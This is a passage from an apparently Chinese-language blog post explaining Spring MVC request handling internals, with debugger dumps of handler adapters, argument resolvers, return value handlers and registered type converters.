class="code"><pre><span class="line">this.handlerAdapters = &#123;ArrayList@5983&#125;  size = 3</span><br><span class="line"> 0 = &#123;RequestMappingHandlerAdapter@4845&#125; </span><br><span class="line"> 1 = &#123;HttpRequestHandlerAdapter@6268&#125; </span><br><span class="line"> 2 = &#123;SimpleControllerHandlerAdapter@6269&#125;</span><br></pre></td></tr></table></figure><p>涉及到的请求处理:</p><pre><code>a. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod    调用对应的controller方法b. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView    返回模型和视图</code></pre><h2 id="ServletInvocableHandlerMethod"><a href="#ServletInvocableHandlerMethod" class="headerlink" title="ServletInvocableHandlerMethod"></a>ServletInvocableHandlerMethod</h2><p><em>HandlerMethod -&gt; ServletInvocableHandlerMethod</em></p><p>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</p><p>   a. InvocableHandlerMethod#invokeForRequest</p><pre><code>    1. 解析传递的参数, 必要时进行转换(resolver负责映射输入的参数名称和controller方法对应的参数, dataBinder负责类型转换和校验)    2. 反射调用对应的方法b. returnValueHandlers#handleReturnValue    从所有的handler中找到第一个支持对应返回值类型的处理返回值, 可能涉及`HttpMessageConverter`</code></pre><h3 id="argumentResolvers"><a href="#argumentResolvers" class="headerlink" title="argumentResolvers"></a>argumentResolvers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">this.argumentResolvers = &#123;HandlerMethodArgumentResolverComposite@4853&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6533&#125; </span><br><span class="line"> argumentResolvers = &#123;LinkedList@6534&#125;  size = 26</span><br><span class="line">  0 = &#123;RequestParamMethodArgumentResolver@5292&#125; </span><br><span class="line">  1 = &#123;RequestParamMapMethodArgumentResolver@6541&#125; </span><br><span class="line">  2 = &#123;PathVariableMethodArgumentResolver@6542&#125; </span><br><span class="line">  3 = &#123;PathVariableMapMethodArgumentResolver@6543&#125; </span><br><span class="line">  4 = &#123;MatrixVariableMethodArgumentResolver@6544&#125; </span><br><span class="line">  5 = &#123;MatrixVariableMapMethodArgumentResolver@6545&#125; </span><br><span class="line">  6 = &#123;ServletModelAttributeMethodProcessor@6546&#125; </span><br><span class="line">  7 = &#123;RequestResponseBodyMethodProcessor@6547&#125; </span><br><span class="line">  8 = &#123;RequestPartMethodArgumentResolver@6548&#125; </span><br><span class="line">  9 = &#123;RequestHeaderMethodArgumentResolver@6549&#125; </span><br><span class="line">  10 = &#123;RequestHeaderMapMethodArgumentResolver@6550&#125; </span><br><span class="line">  11 = &#123;ServletCookieValueMethodArgumentResolver@6551&#125; </span><br><span class="line">  12 = &#123;ExpressionValueMethodArgumentResolver@6552&#125; </span><br><span class="line">  13 = &#123;SessionAttributeMethodArgumentResolver@6553&#125; </span><br><span class="line">  14 = &#123;RequestAttributeMethodArgumentResolver@6554&#125; </span><br><span class="line">  15 = &#123;ServletRequestMethodArgumentResolver@6555&#125; </span><br><span class="line">  16 = &#123;ServletResponseMethodArgumentResolver@6556&#125; </span><br><span class="line">  17 = &#123;HttpEntityMethodProcessor@6557&#125; </span><br><span class="line">  18 = &#123;RedirectAttributesMethodArgumentResolver@6558&#125; </span><br><span class="line">  19 = &#123;ModelMethodProcessor@6559&#125; </span><br><span class="line">  20 = &#123;MapMethodProcessor@6560&#125; </span><br><span class="line">  21 = &#123;ErrorsMethodArgumentResolver@6561&#125; </span><br><span class="line">  22 = &#123;SessionStatusMethodArgumentResolver@6562&#125; </span><br><span class="line">  23 = &#123;UriComponentsBuilderMethodArgumentResolver@6563&#125; </span><br><span class="line">  24 = &#123;RequestParamMethodArgumentResolver@6564&#125; </span><br><span class="line">  25 = &#123;ServletModelAttributeMethodProcessor@6565&#125; </span><br><span class="line"> argumentResolverCache = &#123;ConcurrentHashMap@6535&#125;  size = 1</span><br><span class="line">  0 = &#123;ConcurrentHashMap$MapEntry@6538&#125; &quot;method &apos;echo&apos; parameter 0&quot; -&gt; </span><br><span class="line">   key = &#123;HandlerMethod$HandlerMethodParameter@5293&#125; &quot;method &apos;echo&apos; parameter 0&quot;</span><br><span class="line">   value = &#123;RequestParamMethodArgumentResolver@5292&#125;</span><br></pre></td></tr></table></figure><h3 id="returnValueHandlers"><a href="#returnValueHandlers" class="headerlink" title="returnValueHandlers"></a>returnValueHandlers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">this.returnValueHandlers = &#123;HandlerMethodReturnValueHandlerComposite@4855&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6567&#125; </span><br><span class="line"> returnValueHandlers = &#123;ArrayList@6568&#125;  size = 15</span><br><span class="line">  0 = &#123;ModelAndViewMethodReturnValueHandler@6570&#125; </span><br><span class="line">  1 = &#123;ModelMethodProcessor@6571&#125; </span><br><span class="line">  2 = &#123;ViewMethodReturnValueHandler@6572&#125; </span><br><span class="line">  3 = &#123;ResponseBodyEmitterReturnValueHandler@6573&#125; </span><br><span class="line">  4 = &#123;StreamingResponseBodyReturnValueHandler@6574&#125; </span><br><span class="line">  5 = &#123;HttpEntityMethodProcessor@6575&#125; </span><br><span class="line">  6 = &#123;HttpHeadersReturnValueHandler@6576&#125; </span><br><span class="line">  7 = &#123;CallableMethodReturnValueHandler@6577&#125; </span><br><span class="line">  8 = &#123;DeferredResultMethodReturnValueHandler@6578&#125; </span><br><span class="line">  9 = &#123;AsyncTaskMethodReturnValueHandler@6579&#125; </span><br><span class="line">  10 = &#123;ModelAttributeMethodProcessor@6580&#125; </span><br><span class="line">  11 = &#123;RequestResponseBodyMethodProcessor@6581&#125; </span><br><span class="line">  12 = &#123;ViewNameMethodReturnValueHandler@6582&#125; </span><br><span class="line">  13 = &#123;MapMethodProcessor@6583&#125; </span><br><span class="line">  14 = &#123;ModelAttributeMethodProcessor@6584&#125;</span><br></pre></td></tr></table></figure><h3 id="binderFactory"><a href="#binderFactory" class="headerlink" title="binderFactory"></a>binderFactory</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">binderFactory = &#123;ServletRequestDataBinderFactory@6498&#125; </span><br><span class="line"> binderMethods = &#123;ArrayList@6585&#125;  size = 0</span><br><span class="line"> initializer = &#123;ConfigurableWebBindingInitializer@4859&#125; </span><br><span class="line">  autoGrowNestedPaths = true</span><br><span class="line">  directFieldAccess = false</span><br><span class="line">  messageCodesResolver = null</span><br><span class="line">  bindingErrorProcessor = null</span><br><span class="line">  validator = null</span><br><span class="line">  conversionService = &#123;DefaultFormattingConversionService@6586&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">   embeddedValueResolver = &#123;EmbeddedValueResolver@6003&#125; </span><br><span class="line">   cachedPrinters = &#123;ConcurrentHashMap@6588&#125;  size = 0</span><br><span class="line">   cachedParsers = &#123;ConcurrentHashMap@6589&#125;  size = 0</span><br><span class="line">   converters = &#123;GenericConversionService$Converters@6590&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">    globalConverters = &#123;LinkedHashSet@6593&#125;  size = 0</span><br><span class="line">    converters = &#123;LinkedHashMap@6594&#125;  size = 118</span><br><span class="line">     0 = &#123;LinkedHashMap$Entry@6597&#125; &quot;java.lang.Number -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Number : org.springframework.core.convert.support.NumberToNumberConverterFactory@76561efa&quot;</span><br><span class="line">     1 = &#123;LinkedHashMap$Entry@6598&#125; &quot;java.lang.String -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Number : org.springframework.core.convert.support.StringToNumberConverterFactory@1bf7855e&quot;</span><br><span class="line">     2 = &#123;LinkedHashMap$Entry@6599&#125; &quot;java.lang.Number -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@3932e255&quot;</span><br><span class="line">     3 = &#123;LinkedHashMap$Entry@6600&#125; &quot;java.lang.String -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Character : org.springframework.core.convert.support.StringToCharacterConverter@55a6b63f&quot;</span><br><span class="line">     4 = &#123;LinkedHashMap$Entry@6601&#125; &quot;java.lang.Character -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@1341d3bf&quot;</span><br><span class="line">     5 = &#123;LinkedHashMap$Entry@6602&#125; &quot;java.lang.Number -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Character : org.springframework.core.convert.support.NumberToCharacterConverter@34bb79fc&quot;</span><br><span class="line">     6 = &#123;LinkedHashMap$Entry@6603&#125; &quot;java.lang.Character -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.Number : org.springframework.core.convert.support.CharacterToNumberFactory@1ab51574&quot;</span><br><span class="line">     7 = &#123;LinkedHashMap$Entry@6604&#125; &quot;java.lang.String -&gt; java.lang.Boolean&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Boolean : org.springframework.core.convert.support.StringToBooleanConverter@7ac24f53&quot;</span><br><span class="line">     8 = &#123;LinkedHashMap$Entry@6605&#125; &quot;java.lang.Boolean -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Boolean -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@6703b79f&quot;</span><br><span class="line">     9 = &#123;LinkedHashMap$Entry@6606&#125; &quot;java.lang.String -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Enum : org.springframework.core.convert.support.StringToEnumConverterFactory@898561a&quot;</span><br><span class="line">     10 = &#123;LinkedHashMap$Entry@6607&#125; &quot;java.lang.Enum -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.String : org.springframework.core.convert.support.EnumToStringConverter@3a34ecc8&quot;</span><br><span class="line">     11 = &#123;LinkedHashMap$Entry@6608&#125; &quot;java.lang.Integer -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.Integer -&gt; java.lang.Enum : org.springframework.core.convert.support.IntegerToEnumConverterFactory@52e4840a&quot;</span><br><span class="line">     12 = &#123;LinkedHashMap$Entry@6609&#125; &quot;java.lang.Enum -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.Integer : org.springframework.core.convert.support.EnumToIntegerConverter@28217e86&quot;</span><br><span class="line">     13 = &#123;LinkedHashMap$Entry@6610&#125; &quot;java.lang.String -&gt; java.util.Locale&quot; -&gt; &quot;java.lang.String -&gt; java.util.Locale : org.springframework.core.convert.support.StringToLocaleConverter@6243d51e&quot;</span><br><span class="line">     14 = &#123;LinkedHashMap$Entry@6611&#125; &quot;java.util.Locale -&gt; java.lang.String&quot; -&gt; &quot;java.util.Locale -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@7f8c2732&quot;</span><br><span class="line">     15 = &#123;LinkedHashMap$Entry@6612&#125; &quot;java.lang.String -&gt; java.nio.charset.Charset&quot; -&gt; &quot;java.lang.String -&gt; java.nio.charset.Charset : org.springframework.core.convert.support.StringToCharsetConverter@93e281d&quot;</span><br><span class="line">     16 = &#123;LinkedHashMap$Entry@6613&#125; &quot;java.nio.charset.Charset -&gt; java.lang.String&quot; -&gt; &quot;java.nio.charset.Charset -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@2ac8a2f2&quot;</span><br><span class="line">     17 = &#123;LinkedHashMap$Entry@6614&#125; &quot;java.lang.String -&gt; java.util.Currency&quot; -&gt; &quot;java.lang.String -&gt; java.util.Currency : org.springframework.core.convert.support.StringToCurrencyConverter@565f7990&quot;</span><br><span class="line">     18 = &#123;LinkedHashMap$Entry@6615&#125; &quot;java.util.Currency -&gt; java.lang.String&quot; -&gt; &quot;java.util.Currency -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@487461de&quot;</span><br><span class="line">     19 = &#123;LinkedHashMap$Entry@6616&#125; &quot;java.lang.String -&gt; java.util.Properties&quot; -&gt; &quot;java.lang.String -&gt; java.util.Properties : org.springframework.core.convert.support.StringToPropertiesConverter@3072d60d&quot;</span><br><span class="line">     20 = &#123;LinkedHashMap$Entry@6617&#125; &quot;java.util.Properties -&gt; java.lang.String&quot; -&gt; &quot;java.util.Properties -&gt; java.lang.String : org.springframework.core.convert.support.PropertiesToStringConverter@5f423dc3&quot;</span><br><span class="line">     21 = &#123;LinkedHashMap$Entry@6618&#125; &quot;java.lang.String -&gt; java.util.UUID&quot; -&gt; &quot;java.lang.String -&gt; java.util.UUID : org.springframework.core.convert.support.StringToUUIDConverter@72fc4c42&quot;</span><br><span class="line">     22 = &#123;LinkedHashMap$Entry@6619&#125; &quot;java.util.UUID -&gt; java.lang.String&quot; -&gt; &quot;java.util.UUID -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@196db952&quot;</span><br><span class="line">     23 = &#123;LinkedHashMap$Entry@6620&#125; &quot;[Ljava.lang.Object; -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToCollectionConverter@3f09c6cc&quot;</span><br><span class="line">     24 = &#123;LinkedHashMap$Entry@6621&#125; &quot;java.util.Collection -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToArrayConverter@716b58cb&quot;</span><br><span class="line">     25 = &#123;LinkedHashMap$Entry@6622&#125; &quot;[Ljava.lang.Object; -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToArrayConverter@61e594f8&quot;</span><br><span class="line">     26 = &#123;LinkedHashMap$Entry@6623&#125; &quot;java.util.Collection -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToCollectionConverter@153616bf&quot;</span><br><span class="line">     27 = &#123;LinkedHashMap$Entry@6624&#125; &quot;java.util.Map -&gt; java.util.Map&quot; -&gt; &quot;org.springframework.core.convert.support.MapToMapConverter@64f88d73&quot;</span><br><span class="line">     28 = &#123;LinkedHashMap$Entry@6625&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToStringConverter@4f7e3c27&quot;</span><br><span class="line">     29 = &#123;LinkedHashMap$Entry@6626&#125; &quot;java.lang.String -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StringToArrayConverter@2713364&quot;</span><br><span class="line">     30 = &#123;LinkedHashMap$Entry@6627&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToObjectConverter@27574e7b&quot;</span><br><span class="line">     31 = &#123;LinkedHashMap$Entry@6628&#125; &quot;java.lang.Object -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToArrayConverter@7e4ccf7&quot;</span><br><span class="line">     32 = &#123;LinkedHashMap$Entry@6629&#125; &quot;java.util.Collection -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToStringConverter@39455728&quot;</span><br><span class="line">     33 = &#123;LinkedHashMap$Entry@6630&#125; &quot;java.lang.String -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StringToCollectionConverter@32a4a977&quot;</span><br><span class="line">     34 = &#123;LinkedHashMap$Entry@6631&#125; &quot;java.util.Collection -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToObjectConverter@2f1d1dce&quot;</span><br><span class="line">     35 = &#123;LinkedHashMap$Entry@6632&#125; &quot;java.lang.Object -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToCollectionConverter@ebfffae&quot;</span><br><span class="line">     36 = &#123;LinkedHashMap$Entry@6633&#125; &quot;[Ljava.lang.Object; -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     37 = &#123;LinkedHashMap$Entry@6634&#125; &quot;java.util.Collection -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     38 = &#123;LinkedHashMap$Entry@6635&#125; &quot;java.util.stream.Stream -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     39 = &#123;LinkedHashMap$Entry@6636&#125; &quot;java.util.stream.Stream -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     40 = &#123;LinkedHashMap$Entry@6637&#125; &quot;java.nio.ByteBuffer -&gt; [B&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     41 = &#123;LinkedHashMap$Entry@6638&#125; &quot;java.nio.ByteBuffer -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     42 = &#123;LinkedHashMap$Entry@6639&#125; &quot;java.lang.Object -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     43 = &#123;LinkedHashMap$Entry@6640&#125; &quot;[B -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     44 = &#123;LinkedHashMap$Entry@6641&#125; &quot;java.lang.String -&gt; java.util.TimeZone&quot; -&gt; &quot;java.lang.String -&gt; java.util.TimeZone : org.springframework.core.convert.support.StringToTimeZoneConverter@4d1c677c&quot;</span><br><span class="line">     45 = &#123;LinkedHashMap$Entry@6642&#125; &quot;java.time.ZoneId -&gt; java.util.TimeZone&quot; -&gt; &quot;java.time.ZoneId -&gt; java.util.TimeZone : org.springframework.core.convert.support.ZoneIdToTimeZoneConverter@3c2fb3fe&quot;</span><br><span class="line">     46 = &#123;LinkedHashMap$Entry@6643&#125; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar : org.springframework.core.convert.support.ZonedDateTimeToCalendarConverter@2148eb08&quot;</span><br><span class="line">     47 = &#123;LinkedHashMap$Entry@6644&#125; &quot;java.lang.Object -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.IdToEntityConverter@6c69ab13,org.springframework.core.convert.support.ObjectToObjectConverter@42600665&quot;</span><br><span class="line">     48 = &#123;LinkedHashMap$Entry@6645&#125; &quot;java.lang.Object -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.FallbackObjectToStringConverter@311fd94&quot;</span><br><span class="line">     49 = &#123;LinkedHashMap$Entry@6646&#125; &quot;java.lang.Object -&gt; java.util.Optional&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToOptionalConverter@65e75655&quot;</span><br><span class="line">     50 = &#123;LinkedHashMap$Entry@6647&#125; &quot;java.lang.Integer -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Integer -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     51 = &#123;LinkedHashMap$Entry@6648&#125; &quot;java.lang.String -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Integer: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     52 = &#123;LinkedHashMap$Entry@6649&#125; &quot;java.lang.Float -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Float -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     53 = &#123;LinkedHashMap$Entry@6650&#125; &quot;java.lang.String -&gt; java.lang.Float&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Float: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     54 = &#123;LinkedHashMap$Entry@6651&#125; &quot;java.math.BigInteger -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigInteger -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     55 = &#123;LinkedHashMap$Entry@6652&#125; &quot;java.lang.String -&gt; java.math.BigInteger&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigInteger: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     56 = &#123;LinkedHashMap$Entry@6653&#125; &quot;java.lang.Byte -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Byte -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     57 = &#123;LinkedHashMap$Entry@6654&#125; &quot;java.lang.String -&gt; java.lang.Byte&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Byte: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     58 = &#123;LinkedHashMap$Entry@6655&#125; &quot;java.lang.Double -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Double -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     59 = &#123;LinkedHashMap$Entry@6656&#125; &quot;java.lang.String -&gt; java.lang.Double&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Double: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     60 = &#123;LinkedHashMap$Entry@6657&#125; &quot;java.lang.Short -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Short -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     61 = &#123;LinkedHashMap$Entry@6658&#125; &quot;java.lang.String -&gt; java.lang.Short&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Short: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     62 = &#123;LinkedHashMap$Entry@6659&#125; &quot;java.lang.Long -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     63 = &#123;LinkedHashMap$Entry@6660&#125; &quot;java.lang.String -&gt; java.lang.Long&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.lang.Long: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Long: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     64 = &#123;LinkedHashMap$Entry@6661&#125; &quot;java.math.BigDecimal -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigDecimal -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     65 = &#123;LinkedHashMap$Entry@6662&#125; &quot;java.lang.String -&gt; java.math.BigDecimal&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigDecimal: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     66 = &#123;LinkedHashMap$Entry@6663&#125; &quot;java.util.Date -&gt; 